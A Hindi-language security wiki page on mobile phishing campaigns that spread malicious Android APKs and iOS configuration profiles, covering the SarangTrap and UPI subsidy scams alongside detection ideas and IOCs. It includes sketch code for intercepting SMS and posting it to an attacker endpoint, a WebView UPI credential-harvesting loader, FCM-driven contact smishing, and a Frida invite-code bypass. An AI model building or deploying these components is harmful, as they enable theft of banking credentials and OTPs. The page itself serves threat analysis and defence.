# मोबाइल फ़िशिंग और दुर्भावनापूर्ण ऐप वितरण (Android और iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> यह पृष्ठ उन तकनीकों को कवर करता है जो खतरे के अभिनेताओं द्वारा **दुर्भावनापूर्ण Android APKs** और **iOS मोबाइल-कॉन्फ़िगरेशन प्रोफाइल** को फ़िशिंग (SEO, सोशल इंजीनियरिंग, फर्जी स्टोर, डेटिंग ऐप्स, आदि) के माध्यम से वितरित करने के लिए उपयोग की जाती हैं।
> सामग्री Zimperium zLabs (2025) द्वारा उजागर SarangTrap अभियान और अन्य सार्वजनिक अनुसंधान से अनुकूलित है।

## हमले का प्रवाह

1. **SEO/फ़िशिंग अवसंरचना**
* समान दिखने वाले डोमेन (डेटिंग, क्लाउड शेयर, कार सेवा…) दर्ज करें।
– Google में रैंक करने के लिए `<title>` तत्व में स्थानीय भाषा के कीवर्ड और इमोजी का उपयोग करें।
– *दोनों* Android (`.apk`) और iOS इंस्टॉलेशन निर्देशों को एक ही लैंडिंग पृष्ठ पर होस्ट करें।
2. **पहला चरण डाउनलोड**
* Android: *unsigned* या "तीसरे पक्ष के स्टोर" APK के लिए सीधा लिंक।
* iOS: `itms-services://` या दुर्भावनापूर्ण **mobileconfig** प्रोफाइल के लिए सामान्य HTTPS लिंक (नीचे देखें)।
3. **पोस्ट-इंस्टॉल सोशल इंजीनियरिंग**
* पहले रन पर ऐप **आमंत्रण / सत्यापन कोड** (विशेष पहुंच का भ्रम) के लिए पूछता है।
* कोड **HTTP के माध्यम से POST** किया जाता है Command-and-Control (C2) पर।
* C2 जवाब देता है `{"success":true}` ➜ मैलवेयर जारी रहता है।
* सैंडबॉक्स / AV डायनामिक विश्लेषण जो कभी भी एक मान्य कोड प्रस्तुत नहीं करता है, **कोई दुर्भावनापूर्ण व्यवहार** नहीं देखता (निष्कासन)।
4. **रनटाइम अनुमति दुरुपयोग** (Android)
* खतरनाक अनुमतियाँ केवल **सकारात्मक C2 प्रतिक्रिया के बाद** मांगी जाती हैं:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- पुराने निर्माणों ने भी SMS अनुमतियों के लिए पूछा -->
```
* हाल के संस्करण **`AndroidManifest.xml` से SMS के लिए `<uses-permission>` हटा देते हैं** लेकिन उस Java/Kotlin कोड पथ को छोड़ देते हैं जो परावर्तन के माध्यम से SMS पढ़ता है ⇒ स्थिर स्कोर को कम करता है जबकि उन उपकरणों पर अभी भी कार्यात्मक है जो `AppOps` दुरुपयोग या पुराने लक्ष्यों के माध्यम से अनुमति देते हैं।
5. **फसाद UI और पृष्ठभूमि संग्रहण**
* ऐप हानिरहित दृश्य (SMS व्यूअर, गैलरी पिकर) दिखाता है जो स्थानीय रूप से लागू होते हैं।
* इस बीच यह एक्सफिल्ट्रेट करता है:
- IMEI / IMSI, फोन नंबर
- पूर्ण `ContactsContract` डंप (JSON एरे)
- `/sdcard/DCIM` से JPEG/PNG को आकार कम करने के लिए [Luban](https://github.com/Curzibn/Luban) के साथ संकुचित किया गया
- वैकल्पिक SMS सामग्री (`content://sms`)
पेलोड्स **बैच-ज़िप किए जाते हैं** और `HTTP POST /upload.php` के माध्यम से भेजे जाते हैं।
6. **iOS वितरण तकनीक**
* एकल **मोबाइल-कॉन्फ़िगरेशन प्रोफाइल** `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` आदि का अनुरोध कर सकता है ताकि डिवाइस को "MDM"-समान पर्यवेक्षण में नामांकित किया जा सके।
* सोशल-इंजीनियरिंग निर्देश:
1. सेटिंग्स खोलें ➜ *प्रोफ़ाइल डाउनलोड किया गया*।
2. *इंस्टॉल* पर तीन बार टैप करें (फ़िशिंग पृष्ठ पर स्क्रीनशॉट)।
3. बिना हस्ताक्षर वाले प्रोफ़ाइल पर भरोसा करें ➜ हमलावर *Contacts* और *Photo* अधिकार प्राप्त करता है बिना ऐप स्टोर समीक्षा के।
7. **नेटवर्क परत**
* सामान्य HTTP, अक्सर पोर्ट 80 पर HOST हेडर के साथ जैसे `api.<phishingdomain>.com`।
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (कोई TLS → पहचानना आसान)।

## रक्षा परीक्षण / रेड-टीम सुझाव

* **डायनामिक विश्लेषण बायपास** – मैलवेयर मूल्यांकन के दौरान, आमंत्रण कोड चरण को Frida/Objection के साथ स्वचालित करें ताकि दुर्भावनापूर्ण शाखा तक पहुंच सकें।
* **Manifest बनाम रनटाइम डिफ़** – `aapt dump permissions` की तुलना करें रनटाइम `PackageManager#getRequestedPermissions()` के साथ; खतरनाक अनुमतियों का गायब होना एक लाल झंडा है।
* **नेटवर्क कैनरी** – कोड प्रविष्टि के बाद असंगत POST बर्स्ट का पता लगाने के लिए `iptables -p tcp --dport 80 -j NFQUEUE` कॉन्फ़िगर करें।
* **mobileconfig निरीक्षण** – macOS पर `security cms -D -i profile.mobileconfig` का उपयोग करें `PayloadContent` को सूचीबद्ध करने और अत्यधिक अधिकारों को पहचानने के लिए।

## ब्लू-टीम पहचान विचार

* **प्रमाणपत्र पारदर्शिता / DNS विश्लेषण** अचानक कीवर्ड-समृद्ध डोमेन के बर्स्ट को पकड़ने के लिए।
* **User-Agent और पथ Regex**: `(?i)POST\s+/(check|upload)\.php` Dalvik क्लाइंट से Google Play के बाहर।
* **आमंत्रण-कोड टेलीमेट्री** – APK इंस्टॉल के तुरंत बाद 6–8 अंकों के संख्यात्मक कोड का POST स्टेजिंग का संकेत दे सकता है।
* **MobileConfig साइनिंग** – बिना हस्ताक्षर वाले कॉन्फ़िगरेशन प्रोफाइल को MDM नीति के माध्यम से अवरुद्ध करें।

## उपयोगी Frida स्निपेट: ऑटो-बायपास आमंत्रण कोड
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## संकेत (सामान्य)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

इस पैटर्न को भारतीय UPI क्रेडेंशियल्स और OTP चुराने के लिए सरकारी लाभ विषयों का दुरुपयोग करने वाले अभियानों में देखा गया है। ऑपरेटर विश्वसनीय प्लेटफार्मों को वितरण और स्थिरता के लिए जोड़ते हैं।

### विश्वसनीय प्लेटफार्मों के बीच वितरण श्रृंखला
- YouTube वीडियो लुभावना → विवरण में एक छोटा लिंक है
- शॉर्टलिंक → वैध पोर्टल की नकल करने वाली GitHub Pages फ़िशिंग साइट
- वही GitHub रेपो एक APK होस्ट करता है जिसमें एक नकली “Google Play” बैज है जो सीधे फ़ाइल से लिंक करता है
- गतिशील फ़िशिंग पृष्ठ Replit पर लाइव हैं; दूरस्थ कमांड चैनल Firebase Cloud Messaging (FCM) का उपयोग करता है

### एम्बेडेड पेलोड और ऑफ़लाइन इंस्टॉल के साथ ड्रॉपर
- पहला APK एक इंस्टॉलर (ड्रॉपर) है जो वास्तविक मैलवेयर को `assets/app.apk` पर भेजता है और उपयोगकर्ता को क्लाउड पहचान को कमजोर करने के लिए Wi‑Fi/मोबाइल डेटा बंद करने के लिए प्रेरित करता है।
- एम्बेडेड पेलोड एक निर्दोष लेबल (जैसे, “Secure Update”) के तहत इंस्टॉल होता है। इंस्टॉलेशन के बाद, इंस्टॉलर और पेलोड दोनों अलग-अलग ऐप के रूप में मौजूद होते हैं।

स्टैटिक ट्रायज टिप (एम्बेडेड पेलोड के लिए grep करें):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dynamic endpoint discovery via shortlink
- Malware एक plain-text, comma-separated सूची को एक shortlink से प्राप्त करता है; सरल string transforms अंतिम phishing page path उत्पन्न करते हैं।

Example (sanitised):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
प्सेUDO-कोड:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-आधारित UPI क्रेडेंशियल हार्वेस्टिंग
- “₹1 / UPI‑Lite का भुगतान करें” चरण एक हमलावर HTML फॉर्म को WebView के अंदर गतिशील एंडपॉइंट से लोड करता है और संवेदनशील फ़ील्ड (फोन, बैंक, UPI PIN) को कैप्चर करता है जो `addup.php` पर `POST` किए जाते हैं।

न्यूनतम लोडर:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### आत्म-प्रसार और SMS/OTP इंटरसेप्शन
- पहले रन पर आक्रामक अनुमतियाँ मांगी जाती हैं:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- संपर्कों को पीड़ित के डिवाइस से सामूहिक रूप से smishing SMS भेजने के लिए लूप किया जाता है।
- आने वाले SMS को एक प्रसारण रिसीवर द्वारा इंटरसेप्ट किया जाता है और मेटाडेटा (प्रेषक, सामग्री, सिम स्लॉट, प्रति-डिवाइस यादृच्छिक आईडी) के साथ `/addsm.php` पर अपलोड किया जाता है।

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) के रूप में लचीला C2
- पेलोड FCM के लिए पंजीकरण करता है; पुश संदेश `_type` फ़ील्ड ले जाते हैं जिसका उपयोग क्रियाओं को ट्रिगर करने के लिए स्विच के रूप में किया जाता है (जैसे, फ़िशिंग टेक्स्ट टेम्पलेट्स को अपडेट करना, व्यवहारों को टॉगल करना)।

उदाहरण FCM पेलोड:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
हैंडलर स्केच:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### शिकार पैटर्न और IOC
- APK में `assets/app.apk` पर द्वितीयक पेलोड होता है
- WebView `gate.htm` से भुगतान लोड करता है और `/addup.php` पर एक्सफिल्ट्रेट करता है
- SMS एक्सफिल्ट्रेशन `/addsm.php` पर
- शॉर्टलिंक-चालित कॉन्फ़िग फ़ेच (जैसे, `rebrand.ly/*`) CSV एंडपॉइंट्स लौटाता है
- ऐप्स को सामान्य "अपडेट/सुरक्षित अपडेट" के रूप में लेबल किया गया है
- अविश्वसनीय ऐप्स में `_type` विभाजक के साथ FCM `data` संदेश

### पहचान और रक्षा विचार
- उन ऐप्स को फ्लैग करें जो उपयोगकर्ताओं को इंस्टॉलेशन के दौरान नेटवर्क बंद करने के लिए कहते हैं और फिर `assets/` से एक दूसरा APK साइड-लोड करते हैं।
- अनुमति ट्यूपल पर अलर्ट करें: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView-आधारित भुगतान प्रवाह।
- गैर-कॉर्पोरेट होस्ट पर `POST /addup.php|/addsm.php` के लिए ईग्रेस मॉनिटरिंग; ज्ञात अवसंरचना को ब्लॉक करें।
- मोबाइल EDR नियम: FCM के लिए पंजीकरण करने वाला अविश्वसनीय ऐप और `_type` फ़ील्ड पर शाखा बनाना।

---

## संदर्भ

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)

{{#include ../../banners/hacktricks-training.md}}
